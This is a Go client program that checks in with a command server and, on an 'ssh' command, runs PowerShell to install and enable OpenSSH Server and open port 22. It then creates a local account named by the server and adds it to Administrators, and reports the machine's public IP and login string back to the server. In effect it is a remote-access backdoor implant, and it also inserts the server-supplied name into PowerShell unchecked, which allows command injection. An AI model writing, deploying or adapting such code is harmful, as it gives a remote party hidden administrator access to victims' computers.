// client.go
package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os/exec"
	"strings"
)

type PingResponse struct {
	Status  string `json:"status"`
	Command string `json:"command"`
	ID      string `json:"ID"`
}

func main() {
	deviceName := "kit kat"
	pingURL := fmt.Sprintf("http://127.0.0.1:8000/ping/%s", url.PathEscape(deviceName))

	resp, err := http.Get(pingURL)
	if err != nil {
		fmt.Println("Error pinging server:", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Read error:", err)
		return
	}

	var pingResp PingResponse
	if err := json.Unmarshal(body, &pingResp); err != nil {
		fmt.Println("JSON parse error:", err)
		return
	}

	fmt.Printf("Got ID: %s, Command: %s\n", pingResp.ID, pingResp.Command)

	if pingResp.Command == "ssh" {
		runPowerShellCommands(pingResp.ID)

		publicIP, err := getPublicIP()
		if err != nil {
			fmt.Println("Failed to get public IP:", err)
			return
		}

		sshConnectString := fmt.Sprintf("ssh %s@%s", pingResp.ID, publicIP)
		fmt.Println("Sending SSH connect string:", sshConnectString)

		if err := sendSSHReceived(deviceName, sshConnectString); err != nil {
			fmt.Println("Error sending SSH received confirmation:", err)
		}
	} else {
		fmt.Println("Command is not ssh — skipping PowerShell execution.")
	}
}

func runPowerShellCommands(cowid string) {
	script := fmt.Sprintf(`
		Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;
		Start-Service sshd;
		Set-Service -Name sshd -StartupType 'Automatic';
		New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server' -Protocol TCP -LocalPort 22 -Action Allow;
		net user %s /add;
		Add-LocalGroupMember -Group "Administrators" -Member "%s";
	`, cowid, cowid)

	cmd := exec.Command("powershell", "-Command", script)
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("Failed PowerShell exec: %v\nOutput: %s\n", err, string(out))
		return
	}

	fmt.Println("PowerShell commands executed successfully!")
}

func sendSSHReceived(deviceName, sshConnect string) error {
	notifyURL := fmt.Sprintf("http://127.0.0.1:8000/ping/ssh/%s/%s",
		url.PathEscape(deviceName), url.PathEscape(sshConnect))

	resp, err := http.Get(notifyURL)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	fmt.Println("Server response to SSH received:", string(body))
	return nil
}

func getPublicIP() (string, error) {
	resp, err := http.Get("https://api.ipify.org")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	ipBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return strings.TrimSpace(string(ipBytes)), nil
}
